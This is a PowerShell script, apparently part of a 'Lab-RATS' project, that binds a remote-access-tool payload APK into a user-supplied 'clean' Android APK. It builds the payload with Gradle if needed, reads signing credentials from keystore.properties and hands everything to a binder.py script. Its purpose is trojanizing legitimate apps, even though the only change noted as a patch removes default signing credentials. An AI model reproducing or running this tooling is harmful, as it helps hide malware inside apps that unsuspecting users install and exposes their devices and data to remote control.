# Lab-RATS Smali Surgery & APK Binding Script (Windows PowerShell)
# Patched: no default signing credentials (reads keystore.properties, created by build.ps1)

Param(
    [string]$TargetApk
)

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ProjectDir = Split-Path -Parent $ScriptDir

Write-Host "==============================================================" -ForegroundColor Cyan
Write-Host "        Lab-RATS Smali Surgery & APK Binder (patched)" -ForegroundColor Cyan
Write-Host "==============================================================" -ForegroundColor Cyan

if (-not $TargetApk) {
    $TargetApk = Read-Host "    Enter path to target clean APK"
}

if (-not (Test-Path $TargetApk)) {
    Write-Host "[!] Target APK file not found: $TargetApk" -ForegroundColor Red
    exit 1
}

$PayloadApk = "$ScriptDir\output\signed_v1.apk"
if (-not (Test-Path $PayloadApk)) {
    $PayloadApk = "$ProjectDir\app\build\outputs\apk\release\app-release.apk"
}

if (-not (Test-Path $PayloadApk)) {
    Write-Host "[!] Payload APK (signed_v1.apk) not found. Building release payload now..." -ForegroundColor Yellow
    Set-Location $ProjectDir
    .\gradlew.bat assembleRelease --no-daemon
    if (Test-Path "$ProjectDir\app\build\outputs\apk\release\app-release.apk") {
        New-Item -ItemType Directory -Force -Path "$ScriptDir\output" | Out-Null
        Copy-Item "$ProjectDir\app\build\outputs\apk\release\app-release.apk" "$ScriptDir\output\signed_v1.apk"
        $PayloadApk = "$ScriptDir\output\signed_v1.apk"
    } else {
        Write-Host "[!] Payload APK compilation failed." -ForegroundColor Red
        exit 1
    }
    Set-Location $ScriptDir
}

# Read signing credentials from keystore.properties (created by build.ps1 New-Keystore).
# No default credentials: binder.py rejects empty/blocked values.
$CredArgs = @()
$PropsPath = Join-Path $ProjectDir "keystore.properties"
if (Test-Path $PropsPath) {
    $storePass = $null; $keyAlias = $null; $storeFile = $null
    Get-Content $PropsPath | ForEach-Object {
        if ($_ -like "storePassword=*") { $storePass = $_.Substring("storePassword=".Length) }
        if ($_ -like "keyAlias=*") { $keyAlias = $_.Substring("keyAlias=".Length) }
        if ($_ -like "storeFile=*") { $storeFile = $_.Substring("storeFile=".Length) }
    }
    if ($storePass -and $keyAlias) {
        $CredArgs += "--storepass"; $CredArgs += $storePass
        $CredArgs += "--keyalias"; $CredArgs += $keyAlias
        if ($storeFile) { $CredArgs += "--keystore"; $CredArgs += (Join-Path $ProjectDir $storeFile) }
    }
}
if ($CredArgs.Count -eq 0) {
    Write-Host "[!] ABORTED: keystore.properties missing or incomplete." -ForegroundColor Red
    Write-Host "    Run build.ps1 -> 'Generate Keystore Only' first (no default credentials are provided)." -ForegroundColor Yellow
    exit 1
}

python "$ScriptDir\binder.py" --target "$TargetApk" --payload "$PayloadApk" @CredArgs
